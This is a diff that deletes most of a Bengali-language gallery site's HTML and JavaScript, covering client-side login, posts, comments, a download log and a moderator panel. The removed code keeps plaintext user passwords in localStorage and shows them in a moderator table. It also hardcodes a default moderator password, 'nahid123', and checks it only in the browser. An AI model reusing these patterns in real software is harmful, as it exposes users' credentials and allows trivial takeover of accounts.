-        <button class="mod-nav-tab" onclick="switchModTab('users-tab',this)">👤 ইউজার</button>
-        <button class="mod-nav-tab" onclick="switchModTab('downloads-tab',this)">📥 ডাউনলোড</button>
-        <button class="mod-nav-tab" onclick="switchModTab('settings-tab',this)">⚙️ ব্র্যান্ডিং</button>
-    </div>
-
-    <!-- POSTS TAB -->
-    <div id="posts-tab" class="mod-section-content active">
-        <div class="mod-box">
-            <h3>✨ নতুন পোস্ট প্রকাশ করুন</h3>
-            <input type="text" id="new-post-title" placeholder="পোস্টের শিরোনাম">
-            <textarea id="new-post-desc" placeholder="পোস্টের বিস্তারিত..." rows="4"></textarea>
-            <input type="file" id="new-post-file" accept="image/*,video/*">
-            <button onclick="addNewPost()">🚀 পোস্ট পাবলিশ করুন</button>
-        </div>
-
-        <div class="mod-box">
-            <h3>📊 সাইট পরিসংখ্যান</h3>
-            <p id="stat-users">রেজিস্টার্ড ইউজার: ০ জন</p>
-            <p id="stat-posts">মোট পোস্ট: ০ টি</p>
-            <p id="stat-comments">মোট কমেন্ট: ০ টি</p>
-        </div>
-
-        <div class="mod-box">
-            <h3>💬 কমেন্ট মডারেশন</h3>
-            <div id="mod-comment-list" style="max-height:200px;overflow:auto;"></div>
-        </div>
-
-        <div class="mod-box">
-            <h3>🔐 মডারেটর পাসওয়ার্ড</h3>
-            <div class="pass-wrapper">
-                <input type="password" id="new-mod-password" placeholder="নতুন পাসওয়ার্ড">
-                <span class="toggle-eye" onclick="togglePassword('new-mod-password',this)">👁️</span>
-            </div>
-            <button onclick="changeModPassword()" style="background:linear-gradient(135deg,#2563eb,#7c3aed);">🔄 পাসওয়ার্ড আপডেট</button>
-        </div>
-    </div>
-
-    <!-- USERS TAB -->
-    <div id="users-tab" class="mod-section-content">
-        <div class="mod-box">
-            <h3>👥 রেজিস্টার্ড ইউজার</h3>
-            <div style="overflow:auto;max-height:300px;">
-                <table class="info-table">
-                    <thead>
-                        <tr>
-                            <th>নাম</th>
-                            <th>ফোন</th>
-                            <th>পাসওয়ার্ড</th>
-                        </tr>
-                    </thead>
-                    <tbody id="mod-user-table-body"></tbody>
-                </table>
-            </div>
-        </div>
-    </div>
-
-    <!-- DOWNLOAD TAB -->
-    <div id="downloads-tab" class="mod-section-content">
-        <div class="mod-box">
-            <h3>📥 ডাউনলোড লগ</h3>
-            <div style="overflow:auto;max-height:300px;">
-                <table class="info-table">
-                    <thead>
-                        <tr>
-                            <th>ইউজার</th>
-                            <th>ফোন</th>
-                            <th>পোস্ট</th>
-                            <th>সময়</th>
-                        </tr>
-                    </thead>
-                    <tbody id="mod-download-table-body"></tbody>
-                </table>
-            </div>
-        </div>
-    </div>
-
-    <!-- BRANDING TAB (LOGO SETTING) -->
-    <div id="settings-tab" class="mod-section-content">
-        <div class="mod-box">
-            <h3>🖼️ সাইট লোগো পরিবর্তন</h3>
-            <input type="file" id="mod-logo-file" accept="image/*">
-            <button onclick="updateSiteLogo()" style="margin-top:10px;">লোগো আপডেট করুন</button>
-        </div>
-    </div>
-</div>
-
-<!-- FEED -->
-<div id="feed-container"></div>
-
-<footer>
-    <p>© 2026 Nahid Gallery Hub</p>
-</footer>
-
-</div>
-
-<script>
-
-/* =====================================================
-   SIDEBAR & PROFILE MODAL LOGIC
-   ===================================================== */
-
-function toggleSidebar() {
-    let sidebar = document.getElementById("sidebar");
-    let overlay = document.getElementById("sidebar-overlay");
-    sidebar.classList.toggle("active");
-    overlay.classList.toggle("active");
-}
-
-function scrollToSection(sectionId) {
-    toggleSidebar();
-    let element = document.getElementById(sectionId);
-    if (element) {
-        element.scrollIntoView({ behavior: 'smooth' });
-    }
-}
-
-function openProfileModal() {
-    let current = JSON.parse(localStorage.getItem("nahid_current_user") || "{}");
-    if(current.role === "moderator") {
-        document.getElementById("user-profile-edit-section").style.display = "none";
-    } else {
-        document.getElementById("user-profile-edit-section").style.display = "block";
-        document.getElementById("update-name").value = current.name || "";
-        document.getElementById("update-phone").value = current.phone || "";
-    }
-    document.getElementById("profile-modal").classList.add("active");
-}
-
-function closeProfileModal() {
-    document.getElementById("profile-modal").classList.remove("active");
-}
-
-function closeProfileModalOutside(e) {
-    if(e.target.id === "profile-modal") {
-        closeProfileModal();
-    }
-}
-
-function toggleDarkMode() {
-    document.body.classList.toggle("dark-mode");
-    let isDark = document.body.classList.contains("dark-mode");
-    localStorage.setItem("nahid_dark_mode", isDark);
-}
-
-function setTheme(pColor, sColor) {
-    document.documentElement.style.setProperty('--primary', pColor);
-    document.documentElement.style.setProperty('--secondary', sColor);
-    document.documentElement.style.setProperty('--gradient', `linear-gradient(135deg, ${pColor}, ${sColor})`);
-    localStorage.setItem("nahid_primary", pColor);
-    localStorage.setItem("nahid_secondary", sColor);
-}
-
-// Load saved theme preferences
-window.addEventListener('DOMContentLoaded', () => {
-    if(localStorage.getItem("nahid_dark_mode") === "true") {
-        document.body.classList.add("dark-mode");
-    }
-    let p = localStorage.getItem("nahid_primary");
-    let s = localStorage.getItem("nahid_secondary");
-    if(p && s) {
-        setTheme(p, s);
-    }
-    loadCustomLogo();
-});
-
-function loadCustomLogo() {
-    let logoData = localStorage.getItem("nahid_site_logo");
-    if(logoData) {
-        let badge = document.getElementById("header-logo-badge");
-        badge.innerHTML = `<img src="${logoData}" alt="Logo">`;
-    }
-}
-
-
-/* =====================================================
-   AUTH & USER MANAGEMENT
-   ===================================================== */
-
-let authMode = "login";
-
-const defaultPosts = [
-    {
-        id:1,
-        title:"Nahid",
-        desc:"মানুষ হারিয়ে গেলে খুঁজে পাওয়া যায়, কিন্তু বদলে গেলে ফিরে পাওয়া যায় না।",
-        media:"photo1.jpg",
-        mediaType:"image",
-        likes:15,
-        likedBy:[],
-        comments:[
-            {user:"Tanvir", text:"অসলেই ভাই 😓!"},
-            {user:"Rakibul", text:"সত্যিই ভাই 😓😔!"}
-        ]
-    },
-    {
-        id:2,
-        title:"🖤😭🖤",
-        desc:"কলিজায় জায়গা দেওয়া মানুষগুলোই, কলিজায় আঘাত করে চলে যায়।",
-        media:"photo2.jpg",
-        mediaType:"image",
-        likes:24,
-        likedBy:[],
-        comments:[
-            {user:"Sakib", text:"একদম ঠিক কথা ভাই!"},
-            {user:"Fahim", text:"সত্যি, ভাই এটাই বাস্তব!"}
-        ]
-    }
-];
-
-window.onload=function(){
-    if(!localStorage.getItem("nahid_mod_pass")){
-        localStorage.setItem("nahid_mod_pass", "nahid123");
-    }
-    let current = localStorage.getItem("nahid_current_user");
-    if(current){
-        showApp(JSON.parse(current));
-    }
-};
-
-function togglePassword(id,icon){
-    let input = document.getElementById(id);
-    if(input.type==="password"){
-        input.type="text";
-        icon.innerText="🙈";
-    }else{
-        input.type="password";
-        icon.innerText="👁️";
-    }
-}
-
-function switchRole(){
-    let role = document.getElementById("role-select").value;
-    if(role==="moderator"){
-        document.getElementById("user-auth-section").style.display="none";
-        document.getElementById("mod-auth-section").style.display="block";
-    }else{
-        document.getElementById("user-auth-section").style.display="block";
-        document.getElementById("mod-auth-section").style.display="none";
-    }
-}
-
-function switchAuthMode(mode){
-    authMode=mode;
-    let nameField = document.getElementById("reg-name-field");
-    let loginTab = document.getElementById("btn-login-tab");
-    let regTab = document.getElementById("btn-reg-tab");
-    let btn = document.getElementById("user-auth-btn");
-
-    if(mode==="register"){
-        nameField.style.display="block";
-        loginTab.classList.remove("active");
-        regTab.classList.add("active");
-        btn.innerText="রেজিস্ট্রেশন সম্পন্ন করুন";
-    }else{
-        nameField.style.display="none";
-        regTab.classList.remove("active");
-        loginTab.classList.add("active");
-        btn.innerText="লগইন করুন";
-    }
-}
-
-function handleUserAuth(){
-    let phone = document.getElementById("user-phone").value.trim();
-    let password = document.getElementById("user-password").value.trim();
-    let users = JSON.parse(localStorage.getItem("nahid_users") || "[]");
-
-    if(!phone || !password){
-        alert("দয়া করে ফোন নাম্বার এবং পাসওয়ার্ড দিন!");
-        return;
-    }
-
-    if(authMode==="register"){
-        let name = document.getElementById("user-name").value.trim();
-        if(!name){
-            alert("দয়া করে আপনার নাম লিখুন!");
-            return;
-        }
-        let exists = users.find(u=>u.phone===phone);
-        if(exists){
-            alert("এই ফোন নাম্বারে ইতিমধ্যে অ্যাকাউন্ট আছে!");
-            return;
-        }
-
-        users.push({name:name, phone:phone, password:password, role:"user"});
-        localStorage.setItem("nahid_users", JSON.stringify(users));
-        alert("✅ রেজিস্ট্রেশন সফল হয়েছে!");
-        switchAuthMode("login");
-        document.getElementById("user-password").value="";
-    }else{
-        let user = users.find(u=>u.phone===phone && u.password===password);
-        if(!user){
-            alert("❌ ভুল ফোন নাম্বার অথবা পাসওয়ার্ড!");
-            return;
-        }
-        let session = {name:user.name, phone:user.phone, role:"user"};
-        localStorage.setItem("nahid_current_user", JSON.stringify(session));
-        showApp(session);
-    }
-}
-
-function handleModLogin(){
-    let password = document.getElementById("mod-password").value;
-    let saved = localStorage.getItem("nahid_mod_pass");
-    if(password!==saved){
-        alert("❌ ভুল মডারেটর পাসওয়ার্ড!");
-        return;
-    }
-    let mod = {name:"মডারেটর", role:"moderator"};
-    localStorage.setItem("nahid_current_user", JSON.stringify(mod));
-    showApp(mod);
-}
-
-function saveUserProfile() {
-    let current = JSON.parse(localStorage.getItem("nahid_current_user"));
-    let newName = document.getElementById("update-name").value.trim();
-    let newPhone = document.getElementById("update-phone").value.trim();
-    let newPass = document.getElementById("update-pass").value.trim();
-
-    if(!newName || !newPhone) {
-        alert("নাম এবং ফোন নম্বর খালি রাখা যাবে না!");
-        return;
-    }
-
-    let users = JSON.parse(localStorage.getItem("nahid_users") || "[]");
-    let userIndex = users.findIndex(u => u.phone === current.phone);
-
-    if(userIndex !== -1) {
-        users[userIndex].name = newName;
-        users[userIndex].phone = newPhone;
-        if(newPass) users[userIndex].password = newPass;
-        localStorage.setItem("nahid_users", JSON.stringify(users));
-    }
-
-    current.name = newName;
-    current.phone = newPhone;
-    localStorage.setItem("nahid_current_user", JSON.stringify(current));
-
-    alert("✅ প্রফাইল সফলভাবে আপডেট হয়েছে!");
-    closeProfileModal();
-    showApp(current);
-}
-
-function changeModPassword(){
-    let pass = document.getElementById("new-mod-password").value.trim();
-    if(!pass){
-        alert("নতুন পাসওয়ার্ড লিখুন!");
-        return;
-    }
-    localStorage.setItem("nahid_mod_pass", pass);
-    document.getElementById("new-mod-password").value="";
-    alert("✅ মডারেটর পাসওয়ার্ড পরিবর্তন হয়েছে!");
-}
-
-function updateSiteLogo() {
-    let fileInput = document.getElementById("mod-logo-file");
-    if(!fileInput.files.length) {
-        alert("দয়া করে একটি লোগো ছবি সিলেক্ট করুন!");
-        return;
-    }
-    let reader = new FileReader();
-    reader.onload = function(e) {
-        localStorage.setItem("nahid_site_logo", e.target.result);
-        loadCustomLogo();
-        alert("✅ সাইট লোগো সফলভাবে আপডেট হয়েছে!");
-    };
-    reader.readAsDataURL(fileInput.files[0]);
-}
-
-function switchModTab(tabId,button){
-    document.querySelectorAll(".mod-section-content").forEach(el=>el.classList.remove("active"));
-    document.querySelectorAll(".mod-nav-tab").forEach(el=>el.classList.remove("active"));
-    document.getElementById(tabId).classList.add("active");
-    button.classList.add("active");
-}
-
-function showApp(user){
-    document.getElementById("auth-screen").style.display="none";
-    document.getElementById("app-container").style.display="block";
-    document.getElementById("welcome-user-msg").innerText = `স্বাগতম, ${user.name} ${user.role==="moderator" ? "👑" : "👤"}`;
-
-    if(user.role==="moderator"){
-        document.getElementById("moderator-control-panel").style.display="block";
-        updateModeratorDashboard();
-    }
-    loadPosts();
-}
-
-function handleLogout(){
-    localStorage.removeItem("nahid_current_user");
-    location.reload();
-}
-
-/* =====================================================
-   POSTS & FEED
-   ===================================================== */
-
-function getPosts(){
-    let data = localStorage.getItem("nahid_posts");
-    if(!data){
-        localStorage.setItem("nahid_posts", JSON.stringify(defaultPosts));
-        return defaultPosts;
-    }
-    return JSON.parse(data);
-}
-
-function loadPosts(){
-    let posts = getPosts();
-    let container = document.getElementById("feed-container");
-    container.innerHTML="";
-
-    posts.forEach(post=>{
-        let comments = post.comments.map(c=>
-            `<div class="comment-item">
-                <strong>${escapeHTML(c.user)}:</strong> ${escapeHTML(c.text)}
-            </div>`
-        ).join("");
-
-        let source = post.media || post.img;
-        let media;
-
-        if(post.mediaType==="video" || (source && source.startsWith("data:video"))){
-            media = `<video src="${source}" controls></video>`;
-        }else{
-            media = `<img src="${source}" alt="Post" onerror="this.style.display='none'">`;
-        }
-
-        container.innerHTML+=`
-            <div class="post">
-                ${media}
-                <h3>${escapeHTML(post.title)}</h3>
-                <p>${escapeHTML(post.desc)}</p>
-                <div class="post-stats">
-                    👍 <span id="like-${post.id}">${post.likes}</span> likes • 💬 ${post.comments.length} comments
-                </div>
-                <div>${comments}</div>
-                <div class="actions">
-                    <button class="love" onclick="likePost(${post.id})">❤️ Like</button>
-                    <button class="comment-btn" onclick="addComment(${post.id})">💬 Comment</button>
-                    <button class="download" onclick="trackAndDownload('${source}','Nahid-Media-${post.id}','${escapeAttr(post.title)}')">📥 Download</button>
-                </div>
-            </div>
-        `;
-    });
-}
-
-function likePost(id){
-    let current = JSON.parse(localStorage.getItem("nahid_current_user"));
-    let posts = getPosts();
-    let post = posts.find(p=>p.id===id);
-
-    if(!post.likedBy) post.likedBy=[];
-    if(post.likedBy.includes(current.name)){
-        alert("আপনি ইতিমধ্যে লাইক দিয়েছেন!");
-        return;
-    }
-
-    post.likedBy.push(current.name);
-    post.likes++;
-    localStorage.setItem("nahid_posts", JSON.stringify(posts));
-    loadPosts();
-}
-
-function addComment(id){
-    let current = JSON.parse(localStorage.getItem("nahid_current_user"));
-    let text = prompt("আপনার কমেন্ট লিখুন:");
-    if(!text || !text.trim()) return;
-
-    let posts = getPosts();
-    let post = posts.find(p=>p.id===id);
-    post.comments.push({user:current.name, text:text.trim()});
-    localStorage.setItem("nahid_posts", JSON.stringify(posts));
-    loadPosts();
-    if(current.role==="moderator"){
-        updateModeratorDashboard();
-    }
-}
-
-function addNewPost(){
-    let title = document.getElementById("new-post-title").value.trim();
-    let desc = document.getElementById("new-post-desc").value.trim();
-    let fileInput = document.getElementById("new-post-file");
-
-    if(!title || !desc || !fileInput.files.length){
-        alert("শিরোনাম, বিবরণ এবং ছবি/ভিডিও দিন!");
-        return;
-    }
-
-    let file = fileInput.files[0];
-    let reader = new FileReader();
-    reader.onload=function(e){
-        let posts = getPosts();
-        let newPost = {
-            id:Date.now(),
-            title:title,
-            desc:desc,
-            media:e.target.result,
-            mediaType:file.type.startsWith("video") ? "video" : "image",
-            likes:0,
-            likedBy:[],
-            comments:[]
-        };
-
-        posts.unshift(newPost);
-        localStorage.setItem("nahid_posts", JSON.stringify(posts));
-        document.getElementById("new-post-title").value="";
-        document.getElementById("new-post-desc").value="";
-        fileInput.value="";
-        loadPosts();
-        updateModeratorDashboard();
-        alert("🎉 পোস্ট সফলভাবে প্রকাশ হয়েছে!");
-    };
-    reader.readAsDataURL(file);
-}
-
-function trackAndDownload(url, filename, title){
-    let current = JSON.parse(localStorage.getItem("nahid_current_user") || '{"name":"Guest","phone":"N/A"}');
-    let downloads = JSON.parse(localStorage.getItem("nahid_downloads") || "[]");
-
-    downloads.unshift({
-        user:current.name,
-        phone:current.phone || "N/A",
-        item:title,
-        time:new Date().toLocaleString()
-    });
-
-    localStorage.setItem("nahid_downloads", JSON.stringify(downloads));
-
-    let a = document.createElement("a");
-    a.href=url;
-    a.download=filename;
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
-
-    if(current.role==="moderator"){
-        updateModeratorDashboard();
-    }
-}
-
-function updateModeratorDashboard(){
-    let users = JSON.parse(localStorage.getItem("nahid_users") || "[]");
-    let posts = getPosts();
-    let downloads = JSON.parse(localStorage.getItem("nahid_downloads") || "[]");
-    let totalComments = 0;
-
-    posts.forEach(p=>{ totalComments += p.comments.length; });
-
-    document.getElementById("stat-users").innerText = `রেজিস্টার্ড ইউজার: ${users.length} জন`;
-    document.getElementById("stat-posts").innerText = `মোট পোস্ট: ${posts.length} টি`;
-    document.getElementById("stat-comments").innerText = `মোট কমেন্ট: ${totalComments} টি`;
-
-    // Comments
-    let commentBox = document.getElementById("mod-comment-list");
-    commentBox.innerHTML="";
-    posts.forEach(post=>{
-        post.comments.forEach((comment,index)=>{
-            let row = document.createElement("div");
-            row.className = "mod-comment-row";
-            row.innerHTML = `
-                <span><strong>${escapeHTML(comment.user)}:</strong> ${escapeHTML(comment.text)}</span>
-                <button class="delete-comment-btn" onclick="deleteComment(${post.id},${index})">মুছুন</button>
-            `;
-            commentBox.appendChild(row);
-        });
-    });
-    if(!commentBox.children.length){
-        commentBox.innerHTML = `<p style="text-align:center;color:var(--muted);padding:10px;">কোনো কমেন্ট নেই</p>`;
-    }
-
-    // Users
-    let userBody = document.getElementById("mod-user-table-body");
-    userBody.innerHTML="";
-    if(!users.length){
-        userBody.innerHTML = `<tr><td colspan="3" style="text-align:center">কোনো ইউজার নেই</td></tr>`;
-    }else{
-        users.forEach(u=>{
-            userBody.innerHTML += `
-                <tr>
-                    <td>${escapeHTML(u.name)}</td>
-                    <td>${escapeHTML(u.phone)}</td>
-                    <td>${escapeHTML(u.password)}</td>
-                </tr>
-            `;
-        });
-    }
-
-    // Downloads
-    let downloadBody = document.getElementById("mod-download-table-body");
-    downloadBody.innerHTML="";
-    if(!downloads.length){
-        downloadBody.innerHTML = `<tr><td colspan="4" style="text-align:center">এখনো কোনো ডাউনলোড হয়নি</td></tr>`;
-    }else{
-        downloads.forEach(d=>{
-            downloadBody.innerHTML += `
-                <tr>
-                    <td>${escapeHTML(d.user)}</td>
-                    <td>${escapeHTML(d.phone)}</td>
-                    <td>${escapeHTML(d.item)}</td>
-                    <td>${escapeHTML(d.time)}</td>
-                </tr>
-            `;
-        });
-    }
-}
-
-function deleteComment(postId, commentIndex){
-    if(!confirm("এই কমেন্টটি মুছে ফেলবেন?")) return;
-    let posts = getPosts();
-    let post = posts.find(p=>p.id===postId);
-    if(post){
-        post.comments.splice(commentIndex, 1);
-        localStorage.setItem("nahid_posts", JSON.stringify(posts));
-        loadPosts();
-        updateModeratorDashboard();
-    }
-}
-
-function escapeHTML(value){
-    return String(value)
-        .replace(/&/g,"&amp;")
-        .replace(/</g,"&lt;")
-        .replace(/>/g,"&gt;")
-        .replace(/"/g,"&quot;")
-        .replace(/'/g,"&#039;");
-}
-
-function escapeAttr(value){
-    return String(value)
-        .replace(/'/g,"&#039;")
-        .replace(/"/g,"&quot;");
-}
-
-</script>
+  </div>
 
 </body>
-           </html>
+   </html>
